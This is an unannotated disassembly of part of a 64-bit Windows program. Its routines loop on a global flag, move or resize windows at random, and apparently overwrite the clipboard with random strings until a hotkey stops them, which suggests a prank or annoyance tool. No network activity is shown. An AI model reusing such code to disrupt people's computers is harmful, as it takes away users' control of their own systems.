   140001e3f:	cc                   	int3
   140001e40:	48 83 ec 28          	sub    $0x28,%rsp
   140001e44:	81 fa 12 03 00 00    	cmp    $0x312,%edx
   140001e4a:	75 1c                	jne    0x140001e68
   140001e4c:	49 83 f8 01          	cmp    $0x1,%r8
   140001e50:	75 16                	jne    0x140001e68
   140001e52:	33 c9                	xor    %ecx,%ecx
   140001e54:	c6 05 59 b2 00 00 00 	movb   $0x0,0xb259(%rip)        # 0x14000d0b4
   140001e5b:	ff 15 37 65 00 00    	call   *0x6537(%rip)        # 0x140008398
   140001e61:	33 c0                	xor    %eax,%eax
   140001e63:	48 83 c4 28          	add    $0x28,%rsp
   140001e67:	c3                   	ret
   140001e68:	48 83 c4 28          	add    $0x28,%rsp
   140001e6c:	48 ff 25 b5 64 00 00 	rex.W jmp *0x64b5(%rip)        # 0x140008328
   140001e73:	cc                   	int3
   140001e74:	cc                   	int3
   140001e75:	cc                   	int3
   140001e76:	cc                   	int3
   140001e77:	cc                   	int3
   140001e78:	cc                   	int3
   140001e79:	cc                   	int3
   140001e7a:	cc                   	int3
   140001e7b:	cc                   	int3
   140001e7c:	cc                   	int3
   140001e7d:	cc                   	int3
   140001e7e:	cc                   	int3
   140001e7f:	cc                   	int3
   140001e80:	48 83 ec 38          	sub    $0x38,%rsp
   140001e84:	80 3d 29 b2 00 00 00 	cmpb   $0x0,0xb229(%rip)        # 0x14000d0b4
   140001e8b:	0f 84 d1 00 00 00    	je     0x140001f62
   140001e91:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001e96:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140001e9d:	ff ff 7f 
   140001ea0:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140001ea5:	48 be ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%rsi
   140001eac:	ff ff 7f 
   140001eaf:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001eb4:	bf 00 5e d0 b2       	mov    $0xb2d05e00,%edi
   140001eb9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001ec0:	45 33 c9             	xor    %r9d,%r9d
   140001ec3:	48 8d 0d d6 6b 00 00 	lea    0x6bd6(%rip),%rcx        # 0x140008aa0
   140001eca:	45 33 c0             	xor    %r8d,%r8d
   140001ecd:	33 d2                	xor    %edx,%edx
   140001ecf:	ff 15 73 65 00 00    	call   *0x6573(%rip)        # 0x140008448
   140001ed5:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140001eda:	e8 41 f1 ff ff       	call   0x140001020
   140001edf:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140001ee4:	48 3b c6             	cmp    %rsi,%rax
   140001ee7:	7d 0b                	jge    0x140001ef4
   140001ee9:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140001eed:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140001ef2:	eb 05                	jmp    0x140001ef9
   140001ef4:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001ef9:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001efe:	e8 4d 3c 00 00       	call   0x140005b50
   140001f03:	45 33 c9             	xor    %r9d,%r9d
   140001f06:	48 8d 0d c3 6b 00 00 	lea    0x6bc3(%rip),%rcx        # 0x140008ad0
   140001f0d:	45 33 c0             	xor    %r8d,%r8d
   140001f10:	33 d2                	xor    %edx,%edx
   140001f12:	ff 15 30 65 00 00    	call   *0x6530(%rip)        # 0x140008448
   140001f18:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001f1d:	e8 fe f0 ff ff       	call   0x140001020
   140001f22:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140001f27:	48 3b c6             	cmp    %rsi,%rax
   140001f2a:	7d 0b                	jge    0x140001f37
   140001f2c:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140001f30:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140001f35:	eb 05                	jmp    0x140001f3c
   140001f37:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140001f3c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001f41:	e8 0a 3c 00 00       	call   0x140005b50
   140001f46:	80 3d 67 b1 00 00 00 	cmpb   $0x0,0xb167(%rip)        # 0x14000d0b4
   140001f4d:	0f 85 6d ff ff ff    	jne    0x140001ec0
   140001f53:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001f58:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   140001f5d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001f62:	48 83 c4 38          	add    $0x38,%rsp
   140001f66:	c3                   	ret
   140001f67:	cc                   	int3
   140001f68:	cc                   	int3
   140001f69:	cc                   	int3
   140001f6a:	cc                   	int3
   140001f6b:	cc                   	int3
   140001f6c:	cc                   	int3
   140001f6d:	cc                   	int3
   140001f6e:	cc                   	int3
   140001f6f:	cc                   	int3
   140001f70:	40 53                	rex push %rbx
   140001f72:	56                   	push   %rsi
   140001f73:	57                   	push   %rdi
   140001f74:	48 83 ec 50          	sub    $0x50,%rsp
   140001f78:	33 d2                	xor    %edx,%edx
   140001f7a:	48 8d 0d df 69 00 00 	lea    0x69df(%rip),%rcx        # 0x140008960
   140001f81:	ff 15 29 64 00 00    	call   *0x6429(%rip)        # 0x1400083b0
   140001f87:	33 c9                	xor    %ecx,%ecx
   140001f89:	48 8b d8             	mov    %rax,%rbx
   140001f8c:	ff 15 ce 63 00 00    	call   *0x63ce(%rip)        # 0x140008360
   140001f92:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001f97:	8b f8                	mov    %eax,%edi
   140001f99:	ff 15 c1 63 00 00    	call   *0x63c1(%rip)        # 0x140008360
   140001f9f:	80 3d 0e b1 00 00 00 	cmpb   $0x0,0xb10e(%rip)        # 0x14000d0b4
   140001fa6:	8b f0                	mov    %eax,%esi
   140001fa8:	0f 84 07 01 00 00    	je     0x1400020b5
   140001fae:	48 89 ac 24 80 00 00 	mov    %rbp,0x80(%rsp)
   140001fb5:	00 
   140001fb6:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   140001fbd:	ff ff 7f 
   140001fc0:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140001fc5:	49 be ff 79 c4 5e fe 	movabs $0x7ffffffe5ec479ff,%r14
   140001fcc:	ff ff 7f 
   140001fcf:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   140001fd4:	49 bf 00 86 3b a1 01 	movabs $0x1a13b8600,%r15
   140001fdb:	00 00 00 
   140001fde:	66 90                	xchg   %ax,%ax
   140001fe0:	ff 15 0a 66 00 00    	call   *0x660a(%rip)        # 0x1400085f0
   140001fe6:	25 03 00 00 80       	and    $0x80000003,%eax
   140001feb:	7d 07                	jge    0x140001ff4
   140001fed:	ff c8                	dec    %eax
   140001fef:	83 c8 fc             	or     $0xfffffffc,%eax
   140001ff2:	ff c0                	inc    %eax
   140001ff4:	85 c0                	test   %eax,%eax
   140001ff6:	74 4a                	je     0x140002042
   140001ff8:	83 e8 01             	sub    $0x1,%eax
   140001ffb:	74 40                	je     0x14000203d
   140001ffd:	83 e8 01             	sub    $0x1,%eax
   140002000:	74 22                	je     0x140002024
   140002002:	83 f8 01             	cmp    $0x1,%eax
   140002005:	75 61                	jne    0x140002068
   140002007:	c7 44 24 30 04 00 00 	movl   $0x4,0x30(%rsp)
   14000200e:	00 
   14000200f:	44 8d 47 d8          	lea    -0x28(%rdi),%r8d
   140002013:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140002017:	45 33 c9             	xor    %r9d,%r9d
   14000201a:	c7 44 24 20 28 00 00 	movl   $0x28,0x20(%rsp)
   140002021:	00 
   140002022:	eb 39                	jmp    0x14000205d
   140002024:	c7 44 24 30 04 00 00 	movl   $0x4,0x30(%rsp)
   14000202b:	00 
   14000202c:	45 33 c9             	xor    %r9d,%r9d
   14000202f:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140002033:	c7 44 24 20 28 00 00 	movl   $0x28,0x20(%rsp)
   14000203a:	00 
   14000203b:	eb 1d                	jmp    0x14000205a
   14000203d:	45 33 c9             	xor    %r9d,%r9d
   140002040:	eb 04                	jmp    0x140002046
   140002042:	44 8d 4e d8          	lea    -0x28(%rsi),%r9d
   140002046:	c7 44 24 30 04 00 00 	movl   $0x4,0x30(%rsp)
   14000204d:	00 
   14000204e:	c7 44 24 28 28 00 00 	movl   $0x28,0x28(%rsp)
   140002055:	00 
   140002056:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   14000205a:	45 33 c0             	xor    %r8d,%r8d
   14000205d:	33 d2                	xor    %edx,%edx
   14000205f:	48 8b cb             	mov    %rbx,%rcx
   140002062:	ff 15 d8 62 00 00    	call   *0x62d8(%rip)        # 0x140008340
   140002068:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   14000206d:	e8 ae ef ff ff       	call   0x140001020
   140002072:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140002077:	49 3b c6             	cmp    %r14,%rax
   14000207a:	7d 0b                	jge    0x140002087
   14000207c:	4a 8d 0c 38          	lea    (%rax,%r15,1),%rcx
   140002080:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   140002085:	eb 05                	jmp    0x14000208c
   140002087:	48 89 6c 24 70       	mov    %rbp,0x70(%rsp)
   14000208c:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002091:	e8 ba 3a 00 00       	call   0x140005b50
   140002096:	80 3d 17 b0 00 00 00 	cmpb   $0x0,0xb017(%rip)        # 0x14000d0b4
   14000209d:	0f 85 3d ff ff ff    	jne    0x140001fe0
   1400020a3:	4c 8b 7c 24 40       	mov    0x40(%rsp),%r15
   1400020a8:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   1400020ad:	48 8b ac 24 80 00 00 	mov    0x80(%rsp),%rbp
   1400020b4:	00 
   1400020b5:	48 83 c4 50          	add    $0x50,%rsp
   1400020b9:	5f                   	pop    %rdi
   1400020ba:	5e                   	pop    %rsi
   1400020bb:	5b                   	pop    %rbx
   1400020bc:	c3                   	ret
   1400020bd:	cc                   	int3
   1400020be:	cc                   	int3
   1400020bf:	cc                   	int3
   1400020c0:	40 53                	rex push %rbx
   1400020c2:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   1400020c9:	48 8b 05 70 af 00 00 	mov    0xaf70(%rip),%rax        # 0x14000d040
   1400020d0:	48 33 c4             	xor    %rsp,%rax
   1400020d3:	48 89 84 24 20 01 00 	mov    %rax,0x120(%rsp)
   1400020da:	00 
   1400020db:	bb dc 00 00 00       	mov    $0xdc,%ebx
   1400020e0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400020e5:	44 8b c3             	mov    %ebx,%r8d
   1400020e8:	33 d2                	xor    %edx,%edx
   1400020ea:	e8 f3 57 00 00       	call   0x1400078e2
   1400020ef:	80 3d be af 00 00 00 	cmpb   $0x0,0xafbe(%rip)        # 0x14000d0b4
   1400020f6:	66 0f 6f 05 22 70 00 	movdqa 0x7022(%rip),%xmm0        # 0x140009120
   1400020fd:	00 
   1400020fe:	f3 0f 7f 44 24 30    	movdqu %xmm0,0x30(%rsp)
   140002104:	66 89 9c 24 84 00 00 	mov    %bx,0x84(%rsp)
   14000210b:	00 
   14000210c:	0f 84 bd 00 00 00    	je     0x1400021cf
   140002112:	48 89 b4 24 40 01 00 	mov    %rsi,0x140(%rsp)
   140002119:	00 
   14000211a:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140002121:	ff ff 7f 
   140002124:	48 89 bc 24 48 01 00 	mov    %rdi,0x148(%rsp)
   14000212b:	00 
   14000212c:	48 be 00 c8 17 a8 04 	movabs $0x4a817c800,%rsi
   140002133:	00 00 00 
   140002136:	48 bf ff 37 e8 57 fb 	movabs $0x7ffffffb57e837ff,%rdi
   14000213d:	ff ff 7f 
   140002140:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002145:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   14000214a:	33 c9                	xor    %ecx,%ecx
   14000214c:	ff 15 f6 61 00 00    	call   *0x61f6(%rip)        # 0x140008348
   140002152:	85 c0                	test   %eax,%eax
   140002154:	74 32                	je     0x140002188
   140002156:	ff 15 94 64 00 00    	call   *0x6494(%rip)        # 0x1400085f0
   14000215c:	25 03 00 00 80       	and    $0x80000003,%eax
   140002161:	7d 07                	jge    0x14000216a
   140002163:	ff c8                	dec    %eax
   140002165:	83 c8 fc             	or     $0xfffffffc,%eax
   140002168:	ff c0                	inc    %eax
   14000216a:	48 63 c8             	movslq %eax,%rcx
   14000216d:	ba 01 00 00 40       	mov    $0x40000001,%edx
   140002172:	8b 44 8c 30          	mov    0x30(%rsp,%rcx,4),%eax
   140002176:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000217b:	89 84 24 94 00 00 00 	mov    %eax,0x94(%rsp)
   140002182:	ff 15 e0 61 00 00    	call   *0x61e0(%rip)        # 0x140008368
   140002188:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   14000218d:	e8 8e ee ff ff       	call   0x140001020
   140002192:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140002197:	48 3b c7             	cmp    %rdi,%rax
   14000219a:	7d 0b                	jge    0x1400021a7
   14000219c:	48 8d 0c 30          	lea    (%rax,%rsi,1),%rcx
   1400021a0:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400021a5:	eb 05                	jmp    0x1400021ac
   1400021a7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400021ac:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400021b1:	e8 9a 39 00 00       	call   0x140005b50
   1400021b6:	80 3d f7 ae 00 00 00 	cmpb   $0x0,0xaef7(%rip)        # 0x14000d0b4
   1400021bd:	75 81                	jne    0x140002140
   1400021bf:	48 8b bc 24 48 01 00 	mov    0x148(%rsp),%rdi
   1400021c6:	00 
   1400021c7:	48 8b b4 24 40 01 00 	mov    0x140(%rsp),%rsi
   1400021ce:	00 
   1400021cf:	48 8b 8c 24 20 01 00 	mov    0x120(%rsp),%rcx
   1400021d6:	00 
   1400021d7:	48 33 cc             	xor    %rsp,%rcx
   1400021da:	e8 a1 47 00 00       	call   0x140006980
   1400021df:	48 81 c4 30 01 00 00 	add    $0x130,%rsp
   1400021e6:	5b                   	pop    %rbx
   1400021e7:	c3                   	ret
   1400021e8:	cc                   	int3
   1400021e9:	cc                   	int3
   1400021ea:	cc                   	int3
   1400021eb:	cc                   	int3
   1400021ec:	cc                   	int3
   1400021ed:	cc                   	int3
   1400021ee:	cc                   	int3
   1400021ef:	cc                   	int3
   1400021f0:	4c 8b dc             	mov    %rsp,%r11
   1400021f3:	48 83 ec 78          	sub    $0x78,%rsp
   1400021f7:	80 3d b6 ae 00 00 00 	cmpb   $0x0,0xaeb6(%rip)        # 0x14000d0b4
   1400021fe:	48 8d 05 fb 68 00 00 	lea    0x68fb(%rip),%rax        # 0x140008b00
   140002205:	49 89 43 a8          	mov    %rax,-0x58(%r11)
   140002209:	48 8d 05 08 69 00 00 	lea    0x6908(%rip),%rax        # 0x140008b18
   140002210:	49 89 43 b0          	mov    %rax,-0x50(%r11)
   140002214:	48 8d 05 15 69 00 00 	lea    0x6915(%rip),%rax        # 0x140008b30
   14000221b:	49 89 43 b8          	mov    %rax,-0x48(%r11)
   14000221f:	48 8d 05 12 69 00 00 	lea    0x6912(%rip),%rax        # 0x140008b38
   140002226:	49 89 43 c0          	mov    %rax,-0x40(%r11)
   14000222a:	48 8d 05 1f 69 00 00 	lea    0x691f(%rip),%rax        # 0x140008b50
   140002231:	49 89 43 c8          	mov    %rax,-0x38(%r11)
   140002235:	48 8d 05 24 69 00 00 	lea    0x6924(%rip),%rax        # 0x140008b60
   14000223c:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   140002240:	0f 84 76 01 00 00    	je     0x1400023bc
   140002246:	49 89 6b f8          	mov    %rbp,-0x8(%r11)
   14000224a:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   140002251:	ff ff 7f 
   140002254:	4d 89 73 e0          	mov    %r14,-0x20(%r11)
   140002258:	49 be ff 0d fa d5 fe 	movabs $0x7ffffffed5fa0dff,%r14
   14000225f:	ff ff 7f 
   140002262:	4d 89 7b d8          	mov    %r15,-0x28(%r11)
   140002266:	49 bf 00 f2 05 2a 01 	movabs $0x12a05f200,%r15
   14000226d:	00 00 00 
   140002270:	49 89 5b 18          	mov    %rbx,0x18(%r11)
   140002274:	49 89 73 f0          	mov    %rsi,-0x10(%r11)
   140002278:	49 89 7b e8          	mov    %rdi,-0x18(%r11)
   14000227c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002280:	33 c9                	xor    %ecx,%ecx
   140002282:	ff 15 e8 60 00 00    	call   *0x60e8(%rip)        # 0x140008370
   140002288:	85 c0                	test   %eax,%eax
   14000228a:	0f 84 c1 00 00 00    	je     0x140002351
   140002290:	ff 15 f2 60 00 00    	call   *0x60f2(%rip)        # 0x140008388
   140002296:	ff 15 54 63 00 00    	call   *0x6354(%rip)        # 0x1400085f0
   14000229c:	44 8b c0             	mov    %eax,%r8d
   14000229f:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
   1400022a4:	41 f7 e8             	imul   %r8d
   1400022a7:	8b ca                	mov    %edx,%ecx
   1400022a9:	c1 e9 1f             	shr    $0x1f,%ecx
   1400022ac:	03 d1                	add    %ecx,%edx
   1400022ae:	8d 0c 52             	lea    (%rdx,%rdx,2),%ecx
   1400022b1:	03 c9                	add    %ecx,%ecx
   1400022b3:	44 2b c1             	sub    %ecx,%r8d
   1400022b6:	49 63 c0             	movslq %r8d,%rax
   1400022b9:	48 8b 4c c4 20       	mov    0x20(%rsp,%rax,8),%rcx
   1400022be:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   1400022c5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400022cc:	00 00 00 00 
   1400022d0:	66 83 7c 41 02 00    	cmpw   $0x0,0x2(%rcx,%rax,2)
   1400022d6:	48 8d 40 01          	lea    0x1(%rax),%rax
   1400022da:	75 f4                	jne    0x1400022d0
   1400022dc:	48 8d 3c 45 02 00 00 	lea    0x2(,%rax,2),%rdi
   1400022e3:	00 
   1400022e4:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400022e9:	48 8b d7             	mov    %rdi,%rdx
   1400022ec:	ff 15 26 5e 00 00    	call   *0x5e26(%rip)        # 0x140008118
   1400022f2:	48 8b f0             	mov    %rax,%rsi
   1400022f5:	ff 15 f5 62 00 00    	call   *0x62f5(%rip)        # 0x1400085f0
   1400022fb:	44 8b c8             	mov    %eax,%r9d
   1400022fe:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
   140002303:	41 f7 e9             	imul   %r9d
   140002306:	8b ca                	mov    %edx,%ecx
   140002308:	c1 e9 1f             	shr    $0x1f,%ecx
   14000230b:	03 d1                	add    %ecx,%edx
   14000230d:	8d 0c 52             	lea    (%rdx,%rdx,2),%ecx
   140002310:	03 c9                	add    %ecx,%ecx
   140002312:	44 2b c9             	sub    %ecx,%r9d
   140002315:	48 8b ce             	mov    %rsi,%rcx
   140002318:	49 63 c1             	movslq %r9d,%rax
   14000231b:	48 8b 5c c4 20       	mov    0x20(%rsp,%rax,8),%rbx
   140002320:	ff 15 1a 5e 00 00    	call   *0x5e1a(%rip)        # 0x140008140
   140002326:	4c 8b c7             	mov    %rdi,%r8
   140002329:	48 8b d3             	mov    %rbx,%rdx
   14000232c:	48 8b c8             	mov    %rax,%rcx
   14000232f:	e8 d7 56 00 00       	call   0x140007a0b
   140002334:	48 8b ce             	mov    %rsi,%rcx
   140002337:	ff 15 43 5d 00 00    	call   *0x5d43(%rip)        # 0x140008080
   14000233d:	48 8b d6             	mov    %rsi,%rdx
   140002340:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140002345:	ff 15 5d 60 00 00    	call   *0x605d(%rip)        # 0x1400083a8
   14000234b:	ff 15 2f 60 00 00    	call   *0x602f(%rip)        # 0x140008380
   140002351:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   140002358:	00 
   140002359:	e8 c2 ec ff ff       	call   0x140001020
   14000235e:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140002365:	00 
   140002366:	49 3b c6             	cmp    %r14,%rax
   140002369:	7d 0e                	jge    0x140002379
   14000236b:	4a 8d 0c 38          	lea    (%rax,%r15,1),%rcx
   14000236f:	48 89 8c 24 80 00 00 	mov    %rcx,0x80(%rsp)
   140002376:	00 
   140002377:	eb 08                	jmp    0x140002381
   140002379:	48 89 ac 24 80 00 00 	mov    %rbp,0x80(%rsp)
   140002380:	00 
   140002381:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   140002388:	00 
   140002389:	e8 c2 37 00 00       	call   0x140005b50
   14000238e:	80 3d 1f ad 00 00 00 	cmpb   $0x0,0xad1f(%rip)        # 0x14000d0b4
   140002395:	0f 85 e5 fe ff ff    	jne    0x140002280
   14000239b:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
   1400023a0:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   1400023a5:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   1400023aa:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   1400023af:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   1400023b4:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400023bb:	00 
   1400023bc:	48 83 c4 78          	add    $0x78,%rsp
   1400023c0:	c3                   	ret
   1400023c1:	cc                   	int3
   1400023c2:	cc                   	int3
   1400023c3:	cc                   	int3
   1400023c4:	cc                   	int3
   1400023c5:	cc                   	int3
   1400023c6:	cc                   	int3
   1400023c7:	cc                   	int3
   1400023c8:	cc                   	int3
   1400023c9:	cc                   	int3
   1400023ca:	cc                   	int3
   1400023cb:	cc                   	int3
   1400023cc:	cc                   	int3
   1400023cd:	cc                   	int3
   1400023ce:	cc                   	int3
   1400023cf:	cc                   	int3
   1400023d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400023d5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400023da:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400023df:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400023e4:	55                   	push   %rbp
   1400023e5:	48 8d ac 24 30 ff ff 	lea    -0xd0(%rsp),%rbp
   1400023ec:	ff 
   1400023ed:	48 81 ec d0 01 00 00 	sub    $0x1d0,%rsp
   1400023f4:	48 8b 05 45 ac 00 00 	mov    0xac45(%rip),%rax        # 0x14000d040
   1400023fb:	48 33 c4             	xor    %rsp,%rax
   1400023fe:	48 89 85 c0 00 00 00 	mov    %rax,0xc0(%rbp)
   140002405:	33 d2                	xor    %edx,%edx
   140002407:	33 c9                	xor    %ecx,%ecx
   140002409:	ff 15 11 62 00 00    	call   *0x6211(%rip)        # 0x140008620
   14000240f:	85 c0                	test   %eax,%eax
   140002411:	0f 88 0e 03 00 00    	js     0x140002725
   140002417:	45 33 f6             	xor    %r14d,%r14d
   14000241a:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   14000241f:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   140002424:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140002429:	c7 44 24 28 03 00 00 	movl   $0x3,0x28(%rsp)
   140002430:	00 
   140002431:	c7 44 24 20 06 00 00 	movl   $0x6,0x20(%rsp)
   140002438:	00 
   140002439:	45 33 c9             	xor    %r9d,%r9d
   14000243c:	45 33 c0             	xor    %r8d,%r8d
   14000243f:	bf ff ff ff ff       	mov    $0xffffffff,%edi
   140002444:	8b d7                	mov    %edi,%edx
   140002446:	33 c9                	xor    %ecx,%ecx
   140002448:	ff 15 ca 61 00 00    	call   *0x61ca(%rip)        # 0x140008618
   14000244e:	8b d8                	mov    %eax,%ebx
   140002450:	85 c0                	test   %eax,%eax
   140002452:	0f 88 c5 02 00 00    	js     0x14000271d
   140002458:	4c 89 75 68          	mov    %r14,0x68(%rbp)
   14000245c:	48 8d 45 68          	lea    0x68(%rbp),%rax
   140002460:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002465:	4c 8d 0d 7c 62 00 00 	lea    0x627c(%rip),%r9        # 0x1400086e8
   14000246c:	33 d2                	xor    %edx,%edx
   14000246e:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002474:	48 8d 0d 7d 62 00 00 	lea    0x627d(%rip),%rcx        # 0x1400086f8
   14000247b:	ff 15 8f 61 00 00    	call   *0x618f(%rip)        # 0x140008610
   140002481:	8b d8                	mov    %eax,%ebx
   140002483:	85 c0                	test   %eax,%eax
   140002485:	0f 88 92 02 00 00    	js     0x14000271d
   14000248b:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   14000248f:	ff 15 13 5e 00 00    	call   *0x5e13(%rip)        # 0x1400082a8
   140002495:	90                   	nop
   140002496:	0f 10 45 a8          	movups -0x58(%rbp),%xmm0
   14000249a:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   14000249f:	f2 0f 10 45 b8       	movsd  -0x48(%rbp),%xmm0
   1400024a4:	f2 0f 11 44 24 58    	movsd  %xmm0,0x58(%rsp)
   1400024aa:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   1400024ae:	ff 15 f4 5d 00 00    	call   *0x5df4(%rip)        # 0x1400082a8
   1400024b4:	90                   	nop
   1400024b5:	0f 10 45 90          	movups -0x70(%rbp),%xmm0
   1400024b9:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   1400024bd:	f2 0f 10 45 a0       	movsd  -0x60(%rbp),%xmm0
   1400024c2:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   1400024c8:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1400024cc:	ff 15 d6 5d 00 00    	call   *0x5dd6(%rip)        # 0x1400082a8
   1400024d2:	90                   	nop
   1400024d3:	0f 10 45 20          	movups 0x20(%rbp),%xmm0
   1400024d7:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   1400024db:	f2 0f 10 45 30       	movsd  0x30(%rbp),%xmm0
   1400024e0:	f2 0f 11 44 24 50    	movsd  %xmm0,0x50(%rsp)
   1400024e6:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400024ea:	ff 15 b8 5d 00 00    	call   *0x5db8(%rip)        # 0x1400082a8
   1400024f0:	90                   	nop
   1400024f1:	0f 10 44 24 70       	movups 0x70(%rsp),%xmm0
   1400024f6:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   1400024fb:	f2 0f 10 44 24 58    	movsd  0x58(%rsp),%xmm0
   140002501:	f2 0f 11 45 80       	movsd  %xmm0,-0x80(%rbp)
   140002506:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   14000250a:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   14000250e:	f2 0f 10 44 24 60    	movsd  0x60(%rsp),%xmm0
   140002514:	f2 0f 11 45 d0       	movsd  %xmm0,-0x30(%rbp)
   140002519:	0f 10 45 e0          	movups -0x20(%rbp),%xmm0
   14000251d:	0f 29 45 e0          	movaps %xmm0,-0x20(%rbp)
   140002521:	f2 0f 10 44 24 50    	movsd  0x50(%rsp),%xmm0
   140002527:	f2 0f 11 45 f0       	movsd  %xmm0,-0x10(%rbp)
   14000252c:	0f 10 45 00          	movups 0x0(%rbp),%xmm0
   140002530:	0f 29 45 40          	movaps %xmm0,0x40(%rbp)
   140002534:	f2 0f 10 4d 10       	movsd  0x10(%rbp),%xmm1
   140002539:	f2 0f 11 4d 50       	movsd  %xmm1,0x50(%rbp)
   14000253e:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002542:	48 8b 01             	mov    (%rcx),%rax
   140002545:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000254a:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000254f:	4c 8d 4d c0          	lea    -0x40(%rbp),%r9
   140002553:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   140002557:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   14000255b:	ff 50 50             	call   *0x50(%rax)
   14000255e:	8b d8                	mov    %eax,%ebx
   140002560:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140002564:	ff 15 2e 5d 00 00    	call   *0x5d2e(%rip)        # 0x140008298
   14000256a:	90                   	nop
   14000256b:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   14000256f:	ff 15 23 5d 00 00    	call   *0x5d23(%rip)        # 0x140008298
   140002575:	90                   	nop
   140002576:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   14000257a:	ff 15 18 5d 00 00    	call   *0x5d18(%rip)        # 0x140008298
   140002580:	90                   	nop
   140002581:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002585:	ff 15 0d 5d 00 00    	call   *0x5d0d(%rip)        # 0x140008298
   14000258b:	85 db                	test   %ebx,%ebx
   14000258d:	0f 88 6b 03 00 00    	js     0x1400028fe
   140002593:	4c 89 75 70          	mov    %r14,0x70(%rbp)
   140002597:	b9 18 00 00 00       	mov    $0x18,%ecx
   14000259c:	e8 07 44 00 00       	call   0x1400069a8
   1400025a1:	48 8b d8             	mov    %rax,%rbx
   1400025a4:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
